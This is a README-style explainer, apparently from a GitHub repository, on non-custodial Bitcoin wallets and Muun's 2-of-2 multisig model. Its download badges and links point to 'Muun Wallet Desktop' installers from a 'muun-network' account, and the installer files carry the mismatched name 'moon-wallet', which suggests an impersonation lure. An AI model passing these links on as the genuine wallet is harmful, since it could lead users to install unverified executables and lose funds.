[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# What Is a Non-Custodial Bitcoin Wallet?

The distinction between custodial and non-custodial wallets is the most important concept in Bitcoin wallet selection. It determines who actually controls your money — you, or someone else.

---

## The core definition

A **non-custodial wallet** is one where the private keys are generated on your device and stay under your control. Private keys are the cryptographic material that authorizes Bitcoin transactions. Whoever controls the private keys controls the Bitcoin. In a non-custodial wallet, that is you.

A **custodial wallet** is one where a provider generates and holds the private keys on your behalf. You have an account with a balance, and the provider authorizes transactions when you request them. The Bitcoin belongs to the provider cryptographically — you have a claim on it, enforced by their policy and your trust in them, not by cryptography.

---

## Why this matters in practice

The most cited lesson in Bitcoin history is the repeated failure of custodial providers. Exchanges and custodial wallet services have been hacked, frozen by regulators, gone bankrupt, or simply stopped operating — in each case, users who held Bitcoin on those platforms lost access to funds they believed they owned.

Non-custodial wallets remove this risk at the source. If Muun Wallet Desktop's company disappeared tomorrow, users who completed their Emergency Kit backup could recover their funds independently using the open-source [recovery tool](https://github.com/muun-network/recovery). No provider cooperation required. This is what the phrase "not your keys, not your coins" refers to.

---

## The trade-off: self-custody requires backup responsibility

Non-custodial wallets shift responsibility for backup to the user. In a custodial service, if you forget your password, account recovery applies. In a non-custodial wallet, if you lose access to your device and your backup, your funds are unrecoverable — there is no provider to restore your account from their records.

This is why every non-custodial wallet setup guide starts with the backup step. For Muun Wallet Desktop, that is the Emergency Kit. For Sparrow or Electrum, it is the BIP39 seed phrase. The backup is the only way back in if the device is lost.

---

## How Muun Wallet Desktop implements non-custody

Muun Wallet Desktop uses a 2-of-2 multisignature model. Your device generates one key; Muun's infrastructure holds a second. Both are required to authorize any transaction. Neither party alone can move funds.

This design is non-custodial in the technical sense — Muun cannot unilaterally access or move your Bitcoin because the cryptographic requirement for your device's signature cannot be bypassed. At the same time, it means recovery requires both the Emergency Kit data and the process that reconstructs access without Muun's active cooperation.

The open-source [recovery tool](https://github.com/muun-network/recovery) at [muun-network/recovery](https://github.com/muun-network/recovery) is the mechanism that enables fully independent recovery. Its existence and public availability are what make the "non-custodial" claim checkable rather than just asserted.

---

## Common misconceptions

**"Non-custodial means completely anonymous."**

Non-custodial means you control your keys. It does not automatically mean privacy. Muun Wallet Desktop connects to Muun's infrastructure, which has some visibility into your activity. Wallets that connect to your own node offer stronger privacy. See [Muun Wallet privacy](muun-wallet-privacy.md) for the specifics.

**"Non-custodial means more complicated."**

It can mean more responsibility, but not necessarily more complexity. Muun Wallet Desktop is non-custodial and installs in minutes with no configuration. The only additional step compared to a custodial app is setting up the Emergency Kit backup — which takes a few minutes. The ongoing experience of using the wallet is not more complicated than a custodial alternative.

**"A 2-of-2 multisig wallet where one key is held by the provider isn't really non-custodial."**

The test is whether the provider can unilaterally move your funds. In Muun's 2-of-2 model, they cannot — your device signature is required. Compare this to exchanges where the provider holds the only key and can do anything with the balance. The models are structurally different.

---

## Getting started with self-custody

Download Muun Wallet Desktop from the [v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1): [macOS](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) | [Windows](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) | [Linux](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip).

Start with the [getting started guide](muun-wallet-getting-started-guide.md) and complete the Emergency Kit backup before sending any real funds. More documentation at [muun-wallet.com](https://muun-wallet.com/).

---

## Related articles

- [Is Muun Wallet safe?](is-muun-wallet-safe.md)
- [Muun Wallet Emergency Kit recovery guide](muun-wallet-emergency-kit-recovery-guide.md)
- [Muun Wallet vs Wallet of Satoshi](muun-wallet-vs-wallet-of-satoshi.md)
- [Muun Wallet getting started guide](muun-wallet-getting-started-guide.md)
- [Muun Wallet review 2026](muun-wallet-review-2026.md)
